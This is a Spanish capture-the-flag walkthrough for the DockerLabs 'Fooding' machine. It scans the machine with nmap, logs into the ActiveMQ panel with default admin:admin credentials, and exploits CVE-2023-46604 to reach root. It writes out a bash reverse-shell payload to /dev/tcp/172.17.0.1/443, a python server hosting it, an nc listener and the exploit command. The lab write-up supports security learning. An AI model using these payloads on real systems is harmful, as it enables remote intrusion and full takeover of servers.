# Máquina Fooding
Enlace a la máquina -> [Dockerlabs](https://mega.nz/file/0SlG3S7Z#bF91meiTF3k8A9RGhvnqdS-Irm-GnDLYGpUQk1S9_lQ)

- **Nombre de la Máquina:** Fooding
- **Sistema Operativo**: Linux
- **Dificultad:** Medium
- **Plataforma:** DockerLabs
- **Dirección IP:** 172.17.0.2
- **Vulnerabilidades Explotadas:**
	- ActiveMQ 5.15.25 exploit

### Reconocimiento
Comenzamos realizando un escaneo general con nmap sobre la IP de la máquina víctima para ver que puertos tiene abiertos.
```bash
sudo nmap -n -Pn -sS -p- --min-rate 5000  172.17.0.2 -oN escaneo.txt
PORT      STATE SERVICE     REASON
80/tcp    open  http        syn-ack
443/tcp   open  https       syn-ack
1883/tcp  open  mqtt        syn-ack
5672/tcp  open  amqp        syn-ack
8161/tcp  open  patrol-snmp syn-ack
41031/tcp open  unknown     syn-ack
61613/tcp open  unknown     syn-ack
61614/tcp open  unknown     syn-ack
61616/tcp open  unknown     syn-ack
```

Lanzamos un conjunto de scripts predeterminado con nmap para que nos reporte más información sobre los servicios.
```bash
sudo nmap -sCV -p80,443,1883,5672,8161,41031,61613,61614,61616 172.17.0.2 -oN targeted.txt
________________________________________________
PORT      STATE SERVICE    VERSION
80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
443/tcp   open  ssl/http   Apache httpd 2.4.59 ((Debian))
|_http-title: DockerLabs | Plantilla gratuita Bootstrap 4.3.x
|_http-server-header: Apache/2.4.59 (Debian)
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
5672/tcp  open  amqp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
8161/tcp  open  http       Jetty 9.4.39.v20210325
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
41031/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
61614/tcp open  http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
|_  Potentially risky methods: TRACE
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|_    5.15.15
```

Entramos a la web del puerto 80 y a la del puerto 443 a inspeccionarlas, no encontramos nada interesante. También hemos aplicado Fuzzing sobre ellas pero no he logrado encontrar nada interesante.

Le echamos un vistazo a la web que corre por el puerto 8161
```bash
http://172.17.0.2:8161/index.html
```

Nos pide autenticación, probamos credenciales comunes como pueden ser:

    root:root
    guest:guest
    admin:admin

Logramos acceder con las credenciales admin:admin

En la web encontramos un directorio /admin en uno de los links. Observamos el panel de ActiveMQ, servicio el cual corre por el puerto 61616, como podemos ver en el reporte de nmap.
![Pasted image 20240707131751](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/b81ba295-d605-4ec7-9f3e-aa5872c21f49)


### Explotación
Tras buscar en internet, encontramos un [exploit](https://github.com/evkl1d/CVE-2023-46604) para la versión 5.15.15 -> Exploit En el exploit tenemos que editar el archivo poc.xml para ejecutar el comando que queremos, en este caso la reverse shell.
```xml
<value>bash</value>
<value>-c</value>
<value>bash -i &gt;&amp; /dev/tcp/172.17.0.1/443 0&gt;&amp;1</value>
```

Este recurso lo compartiremos por el puerto 80 con python:
```bash
sudo python3 -m http.server 80
```

Abriremos el puerto 443 para recibir la reverse shell:
```bash
sudo nc -nlvp 443
```

Ejecutaremos el script, que tomará el poc.xml de nuestro servidor de python. Cabe recalcar que no indicamos el puerto ya que el script usa el puerto por defecto de ActiveMQ que es el 61616.
```bash
python3 CVE-2023-46604-RCE.py -i 172.17.0.2 -u http://172.17.0.1/poc.xml
```

Estamos dentro.
```bash
whoami
----------------
root
```
Y como el usuario que corre el servicio que hemos explotado es root, tenemos los privilegios máximos en el sistema.
